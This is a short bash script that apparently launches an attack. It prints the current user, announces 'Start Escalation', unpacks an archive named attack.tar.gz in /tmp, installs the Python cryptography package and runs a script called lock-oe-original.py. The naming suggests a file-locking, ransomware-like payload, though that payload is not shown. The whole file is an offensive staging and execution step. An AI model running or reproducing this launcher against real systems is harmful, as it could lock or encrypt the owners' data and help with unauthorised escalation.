#!/bin/bash
echo "=========== Cat User: =========="
whoami
echo "========== End ==========="

echo "===== Start Escalation =========="
cd /tmp && tar -xzvf /tmp/attack.tar.gz && pip3 install cryptography && cd attack && python3 ./lock-oe-original.py